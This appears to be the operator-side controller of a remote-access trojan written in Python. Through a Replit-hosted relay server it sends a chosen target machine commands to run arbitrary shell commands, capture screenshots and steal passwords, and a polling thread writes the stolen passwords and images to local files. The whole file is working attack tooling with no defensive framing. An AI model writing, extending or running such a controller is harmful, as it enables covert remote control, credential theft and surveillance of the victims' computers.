import os
import json
import random
import requests
import threading
import asyncio
import subprocess
import base64
import time

URL = "https://62d00077-98c1-400d-9c7d-d9148d8ec7b6-00-37654x8qsze2r.spock.replit.dev/" #"http://127.0.0.1:8080"
LAST_TARGET = ""
current_directory = os.path.dirname(os.path.abspath(__file__))
users_directory = os.path.join(current_directory, 'Users', "User.json")

target_session = input("Enter Target Here: ")

class CommandClass:
    def __init__(self, command: str) -> None:
        self.command = command
        self.data = os.path.join(os.getcwd(), 'data')
        self.menu()
        
        self.commands = {
            'exec': (self.execute_command, self.execute_command.__doc__),
            'ss': (self.take_screenshot, self.take_screenshot.__doc__),
            'password': (self.steal_passwords, self.steal_passwords.__doc__),
            'volume': (self.change_volume, self.change_volume.__doc__),
            'menu': (self.menu, self.menu.__doc__),
        }
        
    def execute_command(self):
        """
            Execute a command on the target machine.
            Prompts for target and command, then sends a request to execute the command\n
        """
        global LAST_TARGET
        target = target_session # input("Enter Target Here: ")
        command = input("Enter Command Here: ")
        print(f"Executing command: {self.command}")
        print("Please wait a few seconds")
        try:
            response = requests.get(f"{URL}/exec?target={target}&command={command}&response=nil_")
            LAST_TARGET = target
        except Exception as e:
            print(e)

    def take_screenshot(self):
        """
        Take a screenshot of the target machine.
        Prompts for target and sends a request to capture the screenshot.\n
        """
        global LAST_TARGET
        try:
            target = target_session # input("Enter Target Here: ")
            response = requests.post(f"{URL}/ss?target={target}&state=true", json={"imgdata": "nil_"})
            LAST_TARGET = target
        except Exception as e:
            print(e)
            
    def change_volume(self):
        """
        Change the volume of the set target.
        Prompts for target and volume percentage, then sends a request to adjust the volume.\n
        """
        global LAST_TARGET
        try:
            target = target_session # input("Enter Target Here: ")
            volume = input("Enter Volume percent (0-100): ")
            response = requests.get(f"{URL}/volume?target={target}&percent={volume}")
            LAST_TARGET = target
        except Exception as e:
            print(e)
            
    def menu(self):
        """
        Display a menu of available commands with descriptions.
        Lists all commands and what they do.\n
        """
        try:
            for command, (func, description) in self.commands.items():
                print(f"{command}: {description.strip() if description else 'No description available'} \n")
        except Exception as e:
            pass
            
    def steal_passwords(self):
        """
        Attempt to steal passwords from the target machine.
        Prompts for target and sends a request to retrieve passwords.\n
        """
        global LAST_TARGET
        target = target_session # input("Enter Target Here: ")
        print("Please wait a few seconds")
        try:
            response = requests.get(f"{URL}/passwords?target={target}&state=true&passwords=[]")
            LAST_TARGET = target
        except Exception as e:
            print(e)

    def execute(self):
        """
            Execute a command based on the command string.
            Parses the command, calls the corresponding function, and handles errors.
        """
        try:
            parts = self.command.split()
            command_name = parts[0]
            if command_name in self.commands:
                func, description = self.commands[command_name]
                if len(parts) > 1:
                    # Extract arguments if available
                    args = parts[1:]
                    func(*args)  # Call the command function with arguments
                else:
                    func()  # Call the command function without arguments
            else:
                print(f"Unknown command: {command_name}")
                self.menu()
        except Exception as e:
            print(f"An error occurred: {e} dsadaadasa")
            
def get_user_data():
    with open(users_directory, "r") as file:
        data = json.load(file)
        
    return data

def writefile(data):
    with open(users_directory, "w") as file:
        json.dump(data, file, indent=4)
        
    return True

def get_first_word(s):
    words = s.split()
    if words:
        return words[0]
    return None

def handle_commands():
    while True:
        try:
            command = input("Command: ")
            if not command:
                continue  # Skip empty commands
            if command.lower() == 'exit':
                break

            command_instance = CommandClass(command.lower())
            command_instance.execute()
            requests.get(f"{URL}/new_cmd?command={get_first_word(command)}")
        except (ConnectionResetError, ConnectionAbortedError) as e:
            print(f"Connection error: {e}")
            break
        except Exception as e:
            print(f"Unexpected error: {e}")

def create_data_folder():
    data_folder = f'{os.getcwd()}/data'    
    if not os.path.exists(data_folder):
        try:
            os.makedirs(data_folder)
            print(f"Created 'data' folder at {data_folder}")
        except OSError as e:
            print(f"Error creating 'data' folder: {e}")

create_data_folder()

def get_screenshot(username, base64_string):
    uid = random.randint(1, 50000)
    base64_string = base64.b32decode(base64_string)
    print(f"\nFile Path: {current_directory}/data/{username}-{uid}.png\nCommand: ", end="")
    with open(f'{current_directory}/data/{username}-{uid}.png','wb') as dest_image:
        dest_image.write(base64_string)
    requests.post(f"{URL}/ss?target={username}&state=true", json={"imgdata": "nil_"})


def listen():
    global LAST_TARGET
    while True:
        try:
            if LAST_TARGET == "":
                continue

            response = requests.get(f"{URL}/commands?user={LAST_TARGET}")
            UserData = response.json()[LAST_TARGET]
            commands = UserData.get("commands", {})
            for i, v in commands.items():
                if i == "exec":
                    response = v["response"]
                    if response != "":
                        requests.get(f"{URL}/exec?target={LAST_TARGET}&command=nil_&response=nil_")
                        LAST_TARGET = ""
                        print(f"\nResponse: {response}\nCommand: ", end="")
                elif i == "password" and v["passwords"] != []:
                    requests.get(f"{URL}/passwords?target={LAST_TARGET}&state=false&passwords=[]")
                    print(f"\npasswords retrived from the client \n File Path: {current_directory}/passwords-{LAST_TARGET}.txt\nCommand: ", end="")
                    with open(f"{current_directory}/passwords-{LAST_TARGET}.txt", "w") as f:
                        for password_info in v["passwords"]:
                            f.write(password_info + "\n")
                    LAST_TARGET = ""
                elif i == "ss" and v["imgdata"] != "":
                    get_screenshot(LAST_TARGET, v["imgdata"])
                    
                    LAST_TARGET = ""
                
            time.sleep(5)
        except Exception as e:
            print(f"{e}")

def run_asyncio_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()

    listen_thread = threading.Thread(target=listen)
    listen_thread.start()
    
    command_handler_thread = threading.Thread(target=handle_commands)
    command_handler_thread.start()